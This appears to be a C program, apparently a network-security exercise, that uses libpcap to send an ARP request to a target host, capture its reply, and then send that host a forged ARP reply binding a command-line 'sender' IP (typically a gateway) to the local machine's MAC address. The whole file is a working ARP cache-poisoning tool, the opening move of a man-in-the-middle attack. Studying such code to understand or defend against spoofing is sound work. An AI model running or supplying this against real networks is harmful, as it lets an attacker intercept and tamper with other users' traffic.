#include "header.h"

void display_mac_address(uint8_t* address){
	int i;

	for(i = 0; i < ETHER_ADDR_LEN; i++)
		printf("%02X%c",address[i], (i<ETHER_ADDR_LEN-1) ? ':' : ' ');
	puts("");

}
int send_arp(const char* interface, const char* target_ip, uint8_t* target_mac, const char* sender_ip, const uint16_t operation, pcap_t *handle){
	struct ifreq ifr;
	struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
	struct libnet_ethernet_hdr ether_header;
	struct libnet_arp_hdr arp_header;
	struct in_addr iaddr;
	const size_t ether_header_size = sizeof(struct libnet_ethernet_hdr);
	const size_t arp_header_size = sizeof(struct libnet_arp_hdr);
	const int s = socket(PF_INET, SOCK_STREAM, IPPROTO_IP);
	size_t packet_size;
	uint8_t *packet;
	char buf[INET_ADDRSTRLEN];
	
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	/* get mac address */
	if(ioctl(s, SIOCGIFHWADDR, &ifr) != 0){
		perror( "ioctl() SIOCGIFHWADDR error"); 
		exit(1);
	}
	
	/* packet memory allocate  */
	packet_size = ether_header_size + arp_header_size;
	packet = (uint8_t*)calloc(1, packet_size);

	if(packet == NULL){
		puts("memory allocate failed..");
		return -1;
	}

	/* set ethernet frame */
	if(target_mac != NULL)
		memmove(ether_header.ether_dhost, target_mac, ETHER_ADDR_LEN);
	else
		memset(ether_header.ether_dhost, 0xff, ETHER_ADDR_LEN);

	memmove(ether_header.ether_shost, ifr.ifr_addr.sa_data, ETHER_ADDR_LEN);
	ether_header.ether_type = htons(ETHERTYPE_ARP);


	/* set arp packet*/
	arp_header.ar_hrd = htons(ARPHRD_ETHER); /* hardware format */
	arp_header.ar_pro = htons(ETHERTYPE_IP); /* procotol format */
	arp_header.ar_hln = ETHER_ADDR_LEN; /* hardware length */
	arp_header.ar_pln = IPV4_ADDR_LEN; /* ip addr length */
	arp_header.ar_op  = htons(operation); /* operation type */
	memmove(arp_header.ar_senderHA, ifr.ifr_addr.sa_data, ETHER_ADDR_LEN); /* sender hardware address*/

	/* get ip address */
	if(ioctl(s, SIOCGIFADDR, &ifr) != 0){
		perror("ioctl() SIOCGIFADDR error");
		return -1;
	}

	/* sender ip */
	if(sender_ip == NULL)
		iaddr.s_addr = sin->sin_addr.s_addr;
	else {
		if(inet_pton(AF_INET, sender_ip, &iaddr) == 0){
			puts("sender_ip inet_pton() convert failed..");
			return -1;
		}
	}
	arp_header.ar_senderIP = iaddr.s_addr;


	/* target hardware address */
	if(target_mac != NULL) 
		memmove(arp_header.ar_targetHA, target_mac, ETHER_ADDR_LEN);
	else
		memset(arp_header.ar_targetHA, 0x00, ETHER_ADDR_LEN); 


	/* target ip */
	if(inet_pton(AF_INET, target_ip, &iaddr) == 0){
		puts("target_ip inet_pton() convert failed..");
		return -1;
	}
	arp_header.ar_targetIP = iaddr.s_addr;

	/* memory copy, header to packet*/
	memmove(packet, &ether_header, ether_header_size);
	memmove(packet+ether_header_size, &arp_header, arp_header_size);

	/* send packet */
	pcap_sendpacket(handle, packet, packet_size);

	/* display */
	puts("=========================");
	puts("[Ethernet]");
	printf("dest : ");
	display_mac_address(ether_header.ether_dhost);
	printf("src  : ");
	display_mac_address(ether_header.ether_shost);

	puts("[ARP]");
	printf("dest : ");
	display_mac_address(arp_header.ar_targetHA);
	printf("src  : ");
	display_mac_address(arp_header.ar_senderHA);

	iaddr.s_addr = arp_header.ar_targetIP;
	inet_ntop(AF_INET, &iaddr, buf, INET_ADDRSTRLEN);
	printf("dest : %s\n",buf);
	iaddr.s_addr = arp_header.ar_senderIP;
	inet_ntop(AF_INET, &iaddr, buf, INET_ADDRSTRLEN);
	printf("src  : %s\n", buf);
	puts("=========================");
	
	/* memory free*/
	free(packet);
	packet = NULL;

	return 0;
}

int main (int argc, char *argv[])
{
    pcap_t *handle;         /* Session handle */
    char *dev;          /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    struct bpf_program fp;      /* The compiled filter */
    char filter_exp[] = "arp";  /* The filter expression */
    bpf_u_int32 mask;       /* Our netmask */
    bpf_u_int32 net;        /* Our IP */
    struct pcap_pkthdr *header; /* The header that pcap gives us */
    const uint8_t *packet;      /* The actual packet */
	struct libnet_ethernet_hdr* ether_header;
	struct libnet_arp_hdr* arp_header;
	const size_t ether_header_size = sizeof(struct libnet_ethernet_hdr);
	//size_t arp_header_size = sizeof(struct libnet_arp_hdr);
    const int s = socket (PF_INET, SOCK_STREAM, 0);
	int status;
	char* target_ip;
	char* sender_ip;
	struct in_addr iaddr;

	if(argc != 4){
		puts("argc != 4");
		return 1;
	}

    dev = argv[1]; //get interface
	sender_ip = argv[2];
	target_ip = argv[3];

    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }
    /* Compile and apply the filter */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) { //filter
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    if (pcap_setfilter(handle, &fp) == -1) { //port 80 set
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }


	


	send_arp(dev, target_ip, NULL, NULL, ARPOP_REQUEST, handle);

    while(1){


        /* Grab a packet */
        status = pcap_next_ex(handle, &header, &packet);

        /* No packet */
        if(!status)
            continue;
        
		ether_header = (struct libnet_ethernet_hdr*)packet;
        
		/*is ARP? */
        if(ntohs(ether_header->ether_type) == ETHERTYPE_ARP){
			arp_header = (struct libnet_arp_hdr*)((uint8_t*)ether_header+ether_header_size);
			/* MAC length == 6 && ip length == 4 */
			if(arp_header->ar_pln == IPV4_ADDR_LEN && arp_header->ar_hln == ETHER_ADDR_LEN){
				/* operation == arp reply */
				if(ntohs(arp_header->ar_op) == ARPOP_REPLY){
					inet_aton(target_ip, &iaddr);

					/* request target ip == reply sender ip */
					if(iaddr.s_addr == arp_header->ar_senderIP){
						status = send_arp(dev, target_ip, arp_header->ar_senderHA, sender_ip, ARPOP_REPLY, handle);

						puts( (status==-1) ? "failed.." : "complete!" ); 
						break;

					}
				}
			}
        }
    }
	

    close (s);
    return 0;
}
